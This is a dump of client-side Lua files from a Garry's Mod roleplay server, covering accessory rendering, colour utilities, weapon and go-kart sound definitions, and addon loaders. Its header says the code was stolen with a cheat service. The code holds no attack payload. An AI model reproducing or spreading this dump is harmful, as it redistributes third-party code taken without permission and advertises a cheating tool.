--Stealed clientside server code by exechack.cc
--Hostname: ⋙ GAMBITRP ╽ ПОДАРКИ ╽ FREE VIP ⋘ - Part 5/10 - 06/04/2025


--PATH addons/plib_v5/lua/includes/init.lua:
local ofmt = FindMetaTable
local rawreg = {}

local registry = setmetatable(rawreg, {
    __index = function(t, k) return rawget(rawreg, k) or ofmt(k) end
})

function debug.getregistry()
	print('call debug')
    return registry
end

function FindMetaTable(name)
    return registry[name]
end

-- Init
if (SERVER) then
	AddCSLuaFile()
	AddCSLuaFile 'plib/init.lua'
end
include 'plib/init.lua'

plib.IncludeSH '_init.lua'

-- Extensions
for k, v in pairs(plib.LoadDir('extensions')) do
	plib.IncludeSH(v)
end
for k, v in pairs(plib.LoadDir('extensions/server')) do
	plib.IncludeSV(v)
end
for k, v in pairs(plib.LoadDir('extensions/client')) do
	plib.IncludeCL(v)
end
--PATH addons/plib_v5/lua/includes/_init.lua:
--[[---------------------------------------------------------
	Non-Module includes
-----------------------------------------------------------]]

include ( "util.lua" )			-- Misc Utilities
include ( "util/sql.lua" )		-- Include sql here so it's
								-- available at loadtime to modules.
							
include( "extensions/net.lua" )

--[[---------------------------------------------------------
	Shared Modules
-----------------------------------------------------------]]

require ( "baseclass" )
require ( "concommand" )		-- Console Commands
require ( "saverestore" )		-- Save/Restore
require ( "hook" )				-- Gamemode hooks
require ( "gamemode" )			-- Gamemode manager
require ( "weapons" )			-- SWEP manager
require ( "scripted_ents" )		-- Scripted Entities
require ( "player_manager" )	-- Player models/class manager
require ( "numpad" )
require ( "team" )
require ( "undo" )
require ( "cleanup" )
require ( "duplicator" )
require ( "constraint" )
require ( "construct" )
require ( "usermessage" )
require ( "list" )
require ( "cvars" )
require ( "http" )
require ( "properties" )
require ( "widget" )
require ( "cookie" )
require ( "utf8" )

require ( "drive" )
include ( "drive/drive_base.lua" )
include ( "drive/drive_noclip.lua" )

--[[---------------------------------------------------------
	Serverside only modules
-----------------------------------------------------------]]

if ( SERVER ) then

	require( "ai_task" )
	require( "ai_schedule" )

end


--[[---------------------------------------------------------
	Clientside only modules
-----------------------------------------------------------]]

if ( CLIENT ) then

	require ( "draw" )			-- 2D Draw library
	require ( "markup" )		-- Text markup library
	require ( "effects" )
	require ( "halo" )
	require ( "killicon" )
	require ( "spawnmenu" )
	require ( "controlpanel" )
	require ( "presets" )
	require ( "menubar" )
	require ( "matproxy" )

	include( "util/model_database.lua" )	-- Store information on models as they're loaded
	include( "util/vgui_showlayout.lua" ) 	-- VGUI Performance Debug
	include( "util/tooltips.lua" )
	include( "util/client.lua" )
	include( "util/javascript_util.lua" )
	include( "util/workshop_files.lua" )
	include( "gui/icon_progress.lua" )

end


--[[---------------------------------------------------------
	Shared modules
-----------------------------------------------------------]]
include( "gmsave.lua" )

--[[---------------------------------------------------------
	Extensions

	Load extensions that we specifically need for the menu,
	to reduce the chances of loading something that might
	cause errors.
-----------------------------------------------------------]]

include ( "extensions/file.lua" )
include ( "extensions/angle.lua" )
include ( "extensions/debug.lua" )
include ( "extensions/entity.lua" )
include ( "extensions/ents.lua" )
include ( "extensions/math.lua" )
include ( "extensions/player.lua" )
include ( "extensions/player_auth.lua" )
include ( "extensions/string.lua" )
include ( "extensions/table.lua" )
include ( "extensions/util.lua" )
include ( "extensions/vector.lua" )
include ( "extensions/game.lua" )
include ( "extensions/motionsensor.lua" )
include ( "extensions/weapon.lua" )
include ( "extensions/coroutine.lua" )

if ( CLIENT ) then

	include ( "extensions/client/entity.lua" )
	include ( "extensions/client/globals.lua" )
	include ( "extensions/client/panel.lua" )
	include ( "extensions/client/player.lua" )
	include ( "extensions/client/render.lua" )

	require ( "search" )

end
--PATH addons/plib_v5/lua/plib/extensions/color.lua:
local tonumber 		= tonumber
local string_format = string.format
local string_match 	= string.match
local bit_band		= bit.band
local bit_rshift 	= bit.rshift
local Lerp 			= Lerp

local COLOR = FindMetaTable 'Color'

function Color(r, g, b, a)
	return setmetatable({
		r = tonumber(r) or 255,
		g = tonumber(g) or 255,
		b = tonumber(b) or 255,
		a = tonumber(a) or 255
	}, COLOR)
end

function COLOR:Copy()
	return Color(self.r, self.g, self.b, self.a)
end

function COLOR:Unpack()
	return self.r, self.g, self.b, self.a
end

function COLOR:SetHex(hex)
	local r, g, b = string_match(hex, '#(..)(..)(..)')
	self.r, self.g, self.b = tonumber(r, 16), tonumber(g, 16), tonumber(b, 16)
end

function COLOR:ToHex()
	return string_format('#%02X%02X%02X', self.r, self.g, self.b)
end

function COLOR:SetEncodedRGB(num)
	self.r, self.g, self.b = bit_band(bit_rshift(num, 16), 0xFF), bit_band(num, 0xFF), bit_band(bit_rshift(num, 8), 0xFF)
end

function COLOR:ToEncodedRGB()
	return (self.r * 0x100 + self.g) * 0x100 + self.b
end

function COLOR:SetEncodedRGBA(num)
	self.r, self.g, self.b, self.a = bit_band(bit_rshift(num, 16), 0xFF), bit_band(bit_rshift(num, 8), 0xFF), bit_band(num, 0xFF), bit_band(bit_rshift(num, 24), 0xFF)
end

function COLOR:ToEncodedRGBA()
	return ((self.a * 0x100 + self.r) * 0x100 + self.g) * 0x100 + self.b
end

function COLOR:LerpC(fraction, from, to)
	self.r, self.g, self.b = Lerp(fraction, from.r, to.r), Lerp(fraction, from.g, to.g), Lerp(fraction, from.b, to.b), Lerp(fraction, from.a, to.a)
end
--PATH addons/accessory/lua/accessory/cl_accessory.lua:
-- I like to think this does something
local Vector = Vector
local Angle = Angle
local IsValid = IsValid
local pairs = pairs
local Matrix = Matrix
local bit = bit
local player = player
local team = team
local bit_band = bit.band
local player_GetAll = player.GetAll
local team_GetName = team.GetName

local MySelf = LocalPlayer()
local MYSELFVALID = false
hook.Add("Think", "SH_ACC.Think0", function()
	MySelf = LocalPlayer()
	if (IsValid(MySelf)) then
		MYSELFVALID = true
		SH_ACC:PlayerReady(MySelf)
		hook.Remove("Think", "SH_ACC.Think0")

		net.Start("SH_ACC_READY")
		net.SendToServer()
	end
end)

function SH_ACC:PlayerReady(ply)
	if (!ply.SH_Accessories) then
		ply.SH_Accessories = {}
	end

	if (!ply.SH_AccessoryInfo) then
		ply.SH_AccessoryInfo = {
			inventory = {},
			equipped = {},
		}
	end

	if (ply == MySelf) then
		-- Load adjustments to be ready to transmit
		local t = util.JSONToTable(file.Read("sh_accessory_adjustments.txt", "DATA") or "") or {}
		ply.SH_AccessoryAdjust = t
	else
		ply.SH_AccessoryAdjust = ply.SH_AccessoryAdjust or {}
	end
end

local function VectorOffset(pos, offset, ang)
	local newpos = Vector()
	newpos:Set(pos + ang:Forward() * offset.x + ang:Right() * offset.y + ang:Up() * offset.z)

	return newpos
end

local function AngleOffset(ang, offset)
	local newang = Angle()
	newang:Set(ang)
	newang:RotateAroundAxis(newang:Up(), offset.y)
	newang:RotateAroundAxis(newang:Right(), offset.p)
	newang:RotateAroundAxis(newang:Forward(), offset.r)

	return newang
end

function SH_ACC:DrawAccessories(target, ply)
	if ply:isArrested() then
		return end

	if (!ply.SH_Accessories) then
		SH_ACC:PlayerReady(ply)
	end

	if (ply ~= MySelf and !ply.SH_RequestedAccessories) then
		ply.SH_RequestedAccessories = true

		net.Start("SH_ACC_REQUEST")
			net.WriteEntity(ply)
		net.SendToServer()
	end

	local n = team_GetName(ply:Team())

	local precache = {}
	local cache = {}
	local previewmodel

	for id, cs in pairs (ply.SH_Accessories) do
		if (ply == MySelf and IsValid(_SH_ACC_BUYMENU) and _SH_ACC_BUYMENU.m_Previewing) then
			previewmodel = _SH_ACC_BUYMENU.m_PreviewModel

			local band = bit_band(_SH_ACC_BUYMENU.m_Previewing[2], cs.m_iOccupiedSlots)
			if (band > 0 and previewmodel ~= cs) then
				continue end
		end

		if (!IsValid(cs)) then
			ply:SH_RemoveAccessory(id)
			continue
		end

		if (previewmodel ~= cs) then
			if (cs.m_JobNames and !cs.m_JobNames[n]) then
				continue end

			if (cs.m_JobNamesExclude and cs.m_JobNamesExclude[n]) then
				continue end
		end

		local offset = cs.m_Offset
		if (!offset) then -- que
			continue end

		local boneid
		if (precache[offset.bone]) then
			boneid = precache[offset.bone]
		else
			boneid = target:LookupBone(offset.bone)
			precache[offset.bone] = boneid
		end

		local pos, ang
		if (boneid) then
			if (cache[boneid]) then
				pos, ang = cache[boneid][1], cache[boneid][2]
			else
				local mat = target:GetBoneMatrix(boneid)
				if (!mat) then
					continue end

				pos, ang = mat:GetTranslation(), mat:GetAngles()

				-- Apply model specific bone offsets
				local offset2 = self:GetModelOffset(offset.bone, target)
				if (offset2) then
					if (offset2.pos) then
						pos = VectorOffset(pos, offset2.pos, ang)
					end

					if (offset2.ang) then
						ang = AngleOffset(ang, offset2.ang)
					end
				end

				-- update cache
				cache[boneid] = {pos, ang}
			end
		else
			if (!self.DisplayWithEmptyBone) then
				continue end

			pos = target:GetPos()
			ang = Angle(0, 0, 0)
		end

		local newpos = VectorOffset(pos, offset.pos, ang)
		local newang = AngleOffset(ang, offset.ang)

		-- Apply adjustments if any
		local adjust = ply.SH_AccessoryAdjust and ply.SH_AccessoryAdjust[cs.m_sModel]
		if (adjust) then
			-- cache the offsets if need be
			if (!adjust.p) and (adjust.px or adjust.py or adjust.pz) then
				adjust.p = Vector(adjust.px or 0, adjust.py or 0, adjust.pz or 0)
			end

			if (!adjust.a) and (adjust.ax or adjust.ay or adjust.az) then
				adjust.a = Angle(adjust.ax or 0, adjust.ay or 0, adjust.az or 0)
			end

			if (!adjust.s) and (adjust.sx or adjust.sy or adjust.sz) then
				local mat = Matrix()
				mat:Scale(Vector(adjust.sx or 1, adjust.sy or 1, adjust.sz or 1))
				adjust.s = mat

				cs:EnableMatrix("RenderMultiply", mat)
			end

			-- apply the offests
			if (adjust.p) then
				newpos = VectorOffset(newpos, adjust.p, newang)
			end

			if (adjust.a) then
				newang = AngleOffset(newang, adjust.a)
			end

			cs.m_bAppliedAdjustments = true
		else
			if (cs.m_bAppliedAdjustments) then
				cs.m_bAppliedAdjustments = nil
				cs:DisableMatrix("RenderMultiply")
			end
		end

		cs:SetPos(newpos)
		cs:SetAngles(newang)
		cs:SetRenderOrigin(newpos)
		cs:SetRenderAngles(newang)

		cs:SetupBones()
		cs:DrawModel()
	end
end


hook.Add("PostDrawTranslucentRenderables", "SH_ACC.PostDrawTranslucentRenderables", function()
	if (!MYSELFVALID or !SH_ACC.DrawOnBodies) then
		return end

	for _, ply in ipairs (player_GetAll()) do
		if (ply:Alive()) or (ply == MySelf and IsValid(_SH_ACC_BUYMENU)) then
			continue end
		local ragdoll = ply:GetRagdollEntity()
		if (!IsValid(ragdoll)) then
			continue end

		SH_ACC:DrawAccessories(ragdoll, ply)
	end
end)

hook.Add("PostPlayerDraw", "SH_ACC.PostPlayerDraw", function(ply)
	if (!MYSELFVALID or !ply:Alive()) then
		return end

	-- can't draw hats on both models so draw on shop/editor first
	if (ply == MySelf) and (IsValid(_SH_ACC_BUYMENU) or IsValid(_SH_ACC_EDITOR)) then
		return end
		local directionAng = math.pi / 250
		local aimvector = LocalPlayer():GetAimVector()+Vector(0,0,0)
		local entVector = ply:GetPos() - LocalPlayer():GetShootPos()
		local dot = aimvector:Dot( entVector ) / entVector:Length()
		local result = dot < directionAng
	if (ply ~= MySelf) then
		local dist = SH_ACC.RenderDistance
		if (dist > 0) then
			local mypos = MySelf:GetPos()
			if (mypos:Distance(ply:GetPos()) >= dist) or result then
				return end
		end
	end

	SH_ACC:DrawAccessories(ply, ply)
end)


net.Receive("sh.accessory.remove_cl_props", function()
	local ply = net.ReadEntity()

	if ply.SH_Accessories then
		for k,v in pairs(ply.SH_Accessories) do
			SafeRemoveEntity(v)
		end
	end
end)

-- gameevent.Listen("player_disconnect")

-- hook.Add("player_disconnect", "SH_ACC.player_disconnect", function(data)
-- 	for _, v in pairs (ents.GetAll()) do
-- 		if (IsValid(v) and v.m_sAccOwner and v.m_sAccOwner == data.networkid) then
-- 			SafeRemoveEntity(v)
-- 		end
-- 	end
-- end)

net.Receive("SH_ACC_MENU", function()
	local inv = {}
	for i = 1, net.ReadUInt(32) do
		inv[net.ReadString()] = true
	end

	local svmdl = net.ReadString()

	MySelf.m_sServerModel = svmdl
	MySelf.SH_AccessoryInfo.inventory = inv

	SH_ACC:ShowBuyMenu()
end)

net.Receive("SH_ACC_INV", function()
	local inv = {}
	for i = 1, net.ReadUInt(32) do
		inv[net.ReadString()] = true
	end

	MySelf.SH_AccessoryInfo.inventory = inv
end)

net.Receive("SH_ACC_EQUIP", function()
	local ent = net.ReadEntity()
	local id = net.ReadString()
	local eq = net.ReadBool()

	if (!IsValid(ent) or !ent:IsPlayer()) then
		return end

	SH_ACC:PlayerReady(ent)

	if (eq) then
		ent:SH_AddAccessory(id)
	else
		ent:SH_RemoveAccessory(id)
	end
	ent.SH_AccessoryInfo.equipped[id] = eq and true or nil

	if (ent == MySelf and IsValid(_SH_ACC_BUYMENU)) then
		_SH_ACC_BUYMENU.m_Contents:RefreshOverview(true)
	end
end)

net.Receive("SH_ACC_EQUIPS", function()
	local ent = net.ReadEntity()

	local eqs = {}
	for i = 1, net.ReadUInt(16) do
		eqs[i] = net.ReadString()
	end

	if (!IsValid(ent) or !ent:IsPlayer()) then
		return end

	SH_ACC:PlayerReady(ent)

	ent:SH_RemoveAllAccessories()
	ent.SH_AccessoryInfo.equipped = {}

	for _, id in ipairs (eqs) do
		ent:SH_AddAccessory(id)
		ent.SH_AccessoryInfo.equipped[id] = true
	end

	if (ent == MySelf and IsValid(_SH_ACC_BUYMENU)) then
		_SH_ACC_BUYMENU.m_Contents:RefreshOverview(true)
	end
end)

net.Receive("SH_ACC_ADJUST", function()
	local ent = net.ReadEntity()
	local mdl = net.ReadString()
	if (!IsValid(ent)) then
		return end

	SH_ACC:PlayerReady(ent)

	local tosend = net.ReadUInt(8)

	local tbl = {}
	if (bit.band(tosend, 1) > 0) then
		local pos = net.ReadVector()
		tbl.px = pos.x
		tbl.py = pos.y
		tbl.pz = pos.z
	end

	if (bit.band(tosend, 2) > 0) then
		local ang = net.ReadAngle()
		tbl.ax = ang.x
		tbl.ay = ang.y
		tbl.az = ang.z
	end

	if (bit.band(tosend, 4) > 0) then
		local siz = net.ReadVector()
		tbl.sx = siz.x
		tbl.sy = siz.y
		tbl.sz = siz.z
	end

	ent.SH_AccessoryAdjust[mdl] = tbl
end)

net.Receive("SH_ACC_ADJUST_RESET", function()
	local ent = net.ReadEntity()
	local mdl = net.ReadString()
	if (!IsValid(ent) or !ent.SH_AccessoryAdjust) then
		return end

	ent.SH_AccessoryAdjust[mdl] = nil
end)
--PATH addons/cp_ballistic_shields/lua/autorun/ballistic_shields_loader.lua:
function KostilWork(name)
    print("Функция KostilWork активирована с параметром: " .. name)
end


if SERVER then
	AddCSLuaFile("ballistic_shields/cl_bs_util.lua")
	AddCSLuaFile( "ballistic_shields/sh_bs_util.lua" )
	AddCSLuaFile( "ballistic_shields/sh_bs_lang.lua" )
	AddCSLuaFile("libraries/cl_surfacegeturl.lua")
	AddCSLuaFile("bs_config.lua")
	KostilWork("1819166858")
end
include( "bs_config.lua" )
include( "libraries/cl_surfacegeturl.lua" )
include( "ballistic_shields/cl_bs_util.lua" )
include( "ballistic_shields/sh_bs_util.lua" )
include( "ballistic_shields/sh_bs_lang.lua" )
--PATH addons/grp_knife/lua/autorun/csgo_knife_snd_init.lua:
sound.Add( {
	name = "csgo_knife.Deploy",
	channel = CHAN_WEAPON,
	volume = 0.4,
	level = 65,
	sound = "csgo_knife/knife_deploy1.wav"
} )

sound.Add( {
	name = "csgo_knife.Hit",
	channel = CHAN_WEAPON,
	volume = 1.0,
	level = 65,
	sound = { "csgo_knife/knife_hit1.wav", "csgo_knife/knife_hit2.wav", "csgo_knife/knife_hit3.wav", "csgo_knife/knife_hit4.wav" }
} )

sound.Add( {
	name = "csgo_knife.HitWall",
	channel = CHAN_WEAPON,
	volume = 1.0,
	level = 65,
	sound = { "csgo_knife/knife_hit_01.wav", "csgo_knife/knife_hit_02.wav", "csgo_knife/knife_hit_03.wav", "csgo_knife/knife_hit_04.wav", "csgo_knife/knife_hit_05.wav" }
} )

sound.Add( {
	name = "csgo_knife.HitWall_old",
	channel = CHAN_WEAPON,
	volume = 1.0,
	level = 65,
	sound = { "csgo_knife/knife_hitwall1.wav", "csgo_knife/knife_hitwall2.wav", "csgo_knife/knife_hitwall3.wav", "csgo_knife/knife_hitwall4.wav" }
} )

sound.Add( {
	name = "csgo_knife.Slash",
	channel = CHAN_WEAPON,
	volume = {0.5, 1.0},
	pitch = {97, 105},
	level = 65,
	sound = { "csgo_knife/knife_slash1.wav", "csgo_knife/knife_slash2.wav" }
} )

sound.Add( {
	name = "csgo_knife.Slash_old",
	channel = CHAN_WEAPON,
	volume = {0.5, 1.0},
	pitch = {97, 105},
	level = 65,
	sound = { "csgo_knife/knife_slash1_old.wav", "csgo_knife/knife_slash2_old.wav" }
} )

sound.Add( {
	name = "csgo_knife.Stab",
	channel = CHAN_WEAPON,
	volume = 1.0,
	level = 65,
	sound = "csgo_knife/knife_stab.wav"
} )

-- Butterfly
sound.Add( {
	name = "csgo_ButterflyKnife.backstab01",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_backstab01.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.backstab02",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_backstab02.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.draw01",
	channel = CHAN_ITEM,
	volume = 0.6,
	soundlevel = 65,
	sound = "csgo_knife/bknife_draw01.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.draw02",
	channel = CHAN_ITEM,
	volume = 0.6,
	soundlevel = 65,
	sound = "csgo_knife/bknife_draw02.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.look01_a",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_look01_a.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.look01_b",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_look01_b.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.look02_a",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_look02_a.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.look02_b",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_look02_b.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.look03_a",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_look03_a.wav"
} )

sound.Add( {
	name = "csgo_ButterflyKnife.look03_b",
	channel = CHAN_ITEM,
	volume = 0.4,
	soundlevel = 65,
	sound = "csgo_knife/bknife_look03_b.wav"
} )

sound.Add( {
	name = "csgo_KnifeFalchion.inspect",
	channel = CHAN_STATIC,
	volume = 1,
	soundlevel = 65,
	sound = "csgo_knife/knife_falchion_inspect.wav"
} )

sound.Add( {
	name = "csgo_KnifeFalchion.draw",
	channel = CHAN_STATIC,
	volume = {0.4, 0.9},
	pitch = {97, 105},
	soundlevel = 65,
	sound = "csgo_knife/knife_falchion_draw.wav"
} )

sound.Add( {
	name = "csgo_KnifeFalchion.Catch",
	channel = CHAN_STATIC,
	volume = {0.3, 0.7},
	pitch = {97, 105},
	soundlevel = 65,
	sound = "csgo_knife/knife_falchion_catch.wav"
} )

sound.Add( {
	name = "csgo_KnifeFalchion.Idlev2",
	channel = CHAN_STATIC,
	volume = 1,
	soundlevel = 65,
	sound = "csgo_knife/knife_falchion_idle.wav"
} )

sound.Add( {
	name = "csgo_Weapon.WeaponMove1", 
	channel = CHAN_ITEM,
	volume = 0.15,
	soundlevel = 65,
	sound = "csgo_knife/movement1.wav"
} )

sound.Add( {
	name = "csgo_Weapon.WeaponMove3",
	channel = CHAN_ITEM,
	volume = 0.15,
	soundlevel = 65,
	sound = "csgo_knife/movement3.wav"
} )

sound.Add( {
	name = "csgo_Weapon.WeaponMove2",
	channel = CHAN_ITEM,
	volume = 0.15,
	soundlevel = 65,
	sound = "csgo_knife/movement2.wav"
} )

sound.Add( {
	name = "csgo_KnifePush.Attack1Heavy",
	channel = CHAN_STATIC,
	volume = {0.1, 0.2},
	pitch = {98, 105},
	level = 65,
	sound = { "csgo_knife/knife_push_attack1_heavy_01.wav", "csgo_knife/knife_push_attack1_heavy_02.wav", "csgo_knife/knife_push_attack1_heavy_03.wav", "csgo_knife/knife_push_attack1_heavy_04.wav" }
} )

sound.Add( {
	name = "csgo_KnifePush.LookAtStart",
	channel = CHAN_STATIC,
	volume = 0.2,
	level = 65,
	sound = { "csgo_knife/knife_push_lookat_start.wav" }
} )

sound.Add( {
	name = "csgo_KnifePush.LookAtEnd",
	channel = CHAN_STATIC,
	volume = 0.2,
	level = 65,
	sound = { "csgo_knife/knife_push_lookat_end.wav" }
} )

sound.Add( {
	name = "csgo_KnifePush.Draw",
	channel = CHAN_STATIC,
	volume = 0.3,
	level = 65,
	sound = { "csgo_knife/knife_push_draw.wav" }
} )

sound.Add( {
	name = "KnifeBowie.draw",
	channel = CHAN_STATIC,
	volume = {0.7, 0.8},
    pitch = {99, 100},
	level = 65,
	sound = { "csgo_knife/knife_bowie_draw.wav" }
} )

sound.Add( {
	name = "KnifeBowie.LookAtStart",
	channel = CHAN_STATIC,
	volume = {0.2, 0.2},
    pitch = {99, 100},
	level = 65,
	sound = { "csgo_knife/knife_bowie_inspect_start.wav" }
} )

sound.Add( {
	name = "KnifeBowie.LookAtEnd",
	channel = CHAN_STATIC,
	volume = {0.2, 0.3},
    pitch = {99, 101},
	level = 65,
	sound = { "csgo_knife/knife_bowie_inspect_end.wav" }
} )
--PATH addons/cp_bricks_enchanced_sweps/lua/bricksenchancedsweps/languages/english.lua:
BES.Language = {

}
--PATH addons/cp_bricks_enchanced_sweps/lua/bricksenchancedsweps/client/bes_client.lua:
local function GetImageFromID( URL )
    local CRC = util.CRC( URL )

    local Extension = string.Split( URL, "." )
    Extension = Extension[#Extension] or "png"

    if( not file.Exists( "bricksenchancedsweps/images", "DATA" ) ) then
        file.CreateDir( "bricksenchancedsweps/images" )
    end
    
    if( file.Exists( "bricksenchancedsweps/images/" .. CRC .. "." .. Extension, "DATA" ) ) then
        return Material( "data/bricksenchancedsweps/images/" .. CRC .. "." .. Extension, "noclamp smooth" )
    else
        http.Fetch( URL, function( body )
            file.Write( "bricksenchancedsweps/images/" .. CRC .. "." .. Extension, body )
            return Material( "data/bricksenchancedsweps/images/" .. CRC .. "." .. Extension, "noclamp smooth" )
        end )
    end
end

BES.CachedMaterials = {}

function BES.GetImage( URL, dontContinue )
    if( not isstring( URL ) ) then return Material( "" ) end

    local CRC = util.CRC( URL )

    if( BES.CachedMaterials[CRC] and type( BES.CachedMaterials[CRC] ) == "IMaterial" ) then
        return BES.CachedMaterials[CRC], URL
    elseif( not dontContinue and not BES.CachedMaterials[CRC] ) then
        BES.CachedMaterials[CRC] = GetImageFromID( URL )
        return BES.GetImage( CRC, true )
    else
        return Material( "" )
    end
end

surface.CreateFont( "BES_Myriad_38", {
    font = "MyriadPro-Bold",
    size = 38,
    weight = 500,
} )

surface.CreateFont( "BES_Myriad_24", {
    font = "MyriadPro-Bold",
    size = 24,
    weight = 500,
} )

surface.CreateFont( "BES_UniSans_15", {
    font = "Uni Sans Heavy CAPS",
    size = 15,
    weight = 500,
} )

surface.CreateFont( "BES_UniSans_30", {
    font = "Uni Sans Heavy CAPS",
    size = 30,
    weight = 500,
} )

surface.CreateFont( "BES_Calibri_21", {
    font = "Calibri",
    size = 21,
    weight = 500,
} )

surface.CreateFont( "BES_Calibri_19", {
    font = "Calibri",
    size = 19,
    weight = 500,
} )

surface.CreateFont( "BES_Calibri_16", {
    font = "Calibri",
    size = 16,
    weight = 500,
} )

-- Draws an arc on your screen.
-- startang and endang are in degrees, 
-- radius is the total radius of the outside edge to the center.
-- cx, cy are the x,y coordinates of the center of the arc.
-- roughness determines how many triangles are drawn. Number between 1-360; 2 or 3 is a good number.

local g_grds, g_wgrd, g_sz
function draw.GradientBox(x, y, w, h, al, ...)
    g_grds = {...}
    al = math.Clamp(math.floor(al), 0, 1)
    if(al == 1) then
        local t = w
        w, h = h, t
    end
    g_wgrd = w / (#g_grds - 1)
    local n
    for i = 1, w do
        for c = 1, #g_grds do
            n = c
            if(i <= g_wgrd * c) then
                break
            end
        end
        g_sz = i - (g_wgrd * (n - 1))
        surface.SetDrawColor(
            Lerp(g_sz/g_wgrd, g_grds[n].r, g_grds[n + 1].r),
            Lerp(g_sz/g_wgrd, g_grds[n].g, g_grds[n + 1].g),
            Lerp(g_sz/g_wgrd, g_grds[n].b, g_grds[n + 1].b),
            Lerp(g_sz/g_wgrd, g_grds[n].a, g_grds[n + 1].a))
        if(al == 1) then
            surface.DrawRect(x, y + i, h, 1)
        else
            surface.DrawRect(x + i, y, 1, h)
        end
    end
end
--PATH addons/vehicles_go_kart_vehicle_2228601321/lua/autorun/electric_gokart_soundscript.lua:
sound.Add( {
	name = "gokart_engine_idle",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = 100,
	sound = "vehicles/freeman/gokart_idle.wav"
} )


sound.Add( {
	name = "gokart_engine_null",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = 100,
	sound = "common/null.wav"
} )

sound.Add( {
	name = "gokart_engine_start",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = 100,
	sound = "vehicles/freeman/gokart_start.wav"
} )

sound.Add( {
	name = "gokart_engine_stop",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = 100,
	sound = "vehicles/freeman/gokart_stop.wav"
} )

sound.Add( {
	name = "gokart_engine_rev",
	channel = CHAN_STATIC,
	volume = 0.9,
	level = 80,
	pitch = {95, 105},
	sound = "vehicles/freeman/gokart_rev.wav"
} )

sound.Add( {
	name = "gokart_reverse",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = 100,
	sound = "vehicles/freeman/gokart_throttleoff.wav"
} )

sound.Add( {
	name = "gokart_firstgear",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = 100,
	sound = "vehicles/freeman/gokart_gear1.wav"
} )

sound.Add( {
	name = "gokart_secondgear",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {95, 105},
	sound = "vehicles/freeman/gokart_gear2.wav"
} )

sound.Add( {
	name = "gokart_thirdgear",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {95, 105},
	sound = "vehicles/freeman/gokart_gear3.wav"
} )

sound.Add( {
	name = "gokart_fourthgear",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {105, 115},
	sound = "vehicles/freeman/gokart_gear3.wav"
} )

sound.Add( {
	name = "gokart_firstgear_noshift",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {105, 105},
	sound = "vehicles/freeman/gokart_gear1.wav"
} )

sound.Add( {
	name = "gokart_secondgear_noshift",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {105, 105},
	sound = "vehicles/freeman/gokart_gear2.wav"
} )

sound.Add( {
	name = "gokart_thirdgear_noshift",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {105, 105},
	sound = "vehicles/freeman/gokart_gear3.wav"
} )

sound.Add( {
	name = "gokart_fourthgear_noshift",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {115, 115},
	sound = "vehicles/freeman/gokart_gear3.wav"
} )

sound.Add( {
	name = "gokart_throttleoff_fastspeed",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {90, 105},
	sound = "vehicles/freeman/gokart_throttleoff.wav"
} )


sound.Add( {
	name = "gokart_throttleoff_slowspeed",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {90, 105},
	sound = "vehicles/freeman/gokart_throttleoff.wav"
} )

sound.Add( {
	name = "gokart_skid_lowfriction",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 30,
	pitch = {90, 110},
	sound = "vehicles/freeman/gokart_slickskidsm8.wav"
} )

sound.Add( {
	name = "gokart_skid_normalfriction",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 50,
	pitch = {90, 110},
	sound = "vehicles/freeman/gokart_slickskidsm8.wav"
} )

sound.Add( {
	name = "gokart_skid_highfriction",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {90, 110},
	sound = "vehicles/freeman/gokart_slickskidsm8.wav"
} )

sound.Add( {
	name = "gokart_turbo_on",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 90,
	pitch = {90, 110},
	sound = "vehicles/freeman/gokart_boost.wav"
} )

sound.Add( {
	name = "gokart_impact_medium",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 40,
	pitch = {90, 110},
	sound = "vehicles/freeman/gokart_owmyass.wav"
} )

sound.Add( {
	name = "gokart_impact_heavy",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 80,
	pitch = {90, 110},
	sound = "vehicles/freeman/gokart_OWMYFUCKINGHEAD.wav"
} )
--PATH addons/executioner/lua/autorun/executioner_config.lua:
    --[[
        Script: Executioner
        Developer: ted.lua
        Profile: http://steamcommunity.com/id/tedlua/
    ]]

    Executioner = Executioner or {}
    Executioner.Config = Executioner.Config or {}

    Executioner.Config.Placement = {}
    Executioner.Config.Confirmation = {}
